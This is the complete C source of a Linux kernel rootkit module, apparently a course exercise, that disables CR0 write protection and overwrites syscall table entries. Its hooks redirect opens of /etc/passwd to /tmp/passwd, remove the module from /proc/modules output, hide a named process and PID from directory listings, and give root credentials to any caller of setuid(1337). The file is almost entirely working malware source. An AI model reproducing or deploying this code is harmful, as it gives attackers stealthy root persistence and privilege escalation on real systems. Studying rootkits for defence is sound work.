#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <linux/file.h>
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/types.h>
//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

struct linux_dirent {
  unsigned long  d_ino;     /* Inode number */
  unsigned long  d_off;     /* Offset to next linux_dirent */
  unsigned short d_reclen;  /* Length of this linux_dirent */
  char           d_name[];  /* Filename (null-terminated) */
};
static int process_id = 0;
module_param(process_id, int, 0);
MODULE_PARM_DESC(process_id, "this is a process id");
static char* process_path = "this is not a path";
module_param(process_path, charp, 0000);
MODULE_PARM_DESC(process_path, "process path");
//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.

asmlinkage int (*original_call)(const char *pathname, int flags, mode_t mode);

//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
{
  int a =strcmp(pathname, "/etc/passwd");
  if( a == 0){
    const char * pathname_sneaky = "/tmp/passwd";
    copy_to_user((char * )pathname, pathname_sneaky,11);
  }
  return original_call(pathname, flags, mode);
}
asmlinkage ssize_t (*origin_read)(int fd, void *buf, size_t count);
asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count){
  ssize_t rst = (*origin_read)(fd,buf,count);
  char* p = strstr(buf,"sneaky_mod");
  char* temp;
  char* tempp = (char*)__get_free_page(GFP_TEMPORARY);
  struct file* file = fget(fd);
  char* path = d_path(&file->f_path, tempp, PAGE_SIZE);
  if(strcmp(path,"/proc/modules")==0){
  if(p){
    for(temp = p;temp<(char*) ((char*)buf+rst);temp++){
      if(*temp == '\n'){
	memmove(p, temp+1, (int)(rst-(temp+1-(char*)buf)));
	rst = rst-(temp+1-p);
	break;
      }
    }
  }
  }
  return rst;
}
// for getdents
asmlinkage int (*origin_getdents)(unsigned int fd, struct linux_dirent * dirp,unsigned int count);
asmlinkage int sneaky_getdents (unsigned int fd, struct linux_dirent * dirp,unsigned int count)
{
  int origin_return = (*origin_getdents)(fd, dirp,count);
  char* tempp = (char*)__get_free_page(GFP_TEMPORARY);
  struct file* file = fget(fd);
  char* path = d_path(&file->f_path, tempp, PAGE_SIZE);
  //  printk(KERN_INFO "inside getdents process_path is : %s\n",process_path);
  
  if(strcmp(path,process_path)==0 || strcmp(path, "/proc")==0){
  int temp = origin_return;
  int a;
  int b;
  char prm[20];
  sprintf(prm, "%d", process_id);
  while(temp>0){
    //search through the list
    int len_per_struct = dirp->d_reclen;
    temp = temp - len_per_struct;
    //printk("inside getdents file name is : %s\n", dirp->d_name);
    a = strcmp(dirp->d_name, "sneaky_process");
    b = strcmp(dirp->d_name, prm);
    if((a==0 && strcmp(path,process_path)==0)|| (b==0 && strcmp(path, "/proc")==0)){
      memmove(dirp, (char*)dirp+dirp->d_reclen, temp);
      origin_return = origin_return - len_per_struct;
      //printk("hide successfully\n");
    }
    else{
      if(temp){
	dirp = (struct linux_dirent *)((char*) dirp+dirp->d_reclen);
      }
    }
  }
  }
  return origin_return;
}

//for setuid
asmlinkage int (*origin_setuid) (uid_t uid);
/* Malicious setuid hook syscall */
asmlinkage int sneaky_setuid(uid_t uid)
{
  if (uid == 1337)
    {
      /* Create new cred struct */
      struct cred *np;
      /* Create uid struct */
      kuid_t nuid;
      /* Set uid struct value to 0 */
      nuid.val = 0;
      /* Print UID and EUID of current process to dmesg */
      printk(KERN_INFO "[+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
      printk(KERN_WARNING "[!] Attempting UID change!");
      /* Prepares new set of credentials for task_struct of current process */
      np = prepare_creds();
      /* Set uid of new cred struct to 0 */
      np->uid = nuid;
      /* Set euid of new cred struct to 0 */
      np->euid = nuid;
      /* Commit cred to task_struct of process */
      commit_creds(np);
      printk(KERN_WARNING "[!] Changes Complete!");
    }
  /* Call original setuid syscall */
  return origin_setuid(uid);
}


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);
  //This is the magic! Save away the original 'open system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  origin_getdents = (void*)*(sys_call_table + __NR_getdents);
  origin_read = (void*)*(sys_call_table+__NR_read);
  origin_setuid = (void*)*(sys_call_table+__NR_setuid);
  *(sys_call_table + __NR_setuid) = (unsigned long)sneaky_setuid;
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (unsigned long)origin_getdents;
  *(sys_call_table + __NR_read) = (unsigned long)origin_read;
  *(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

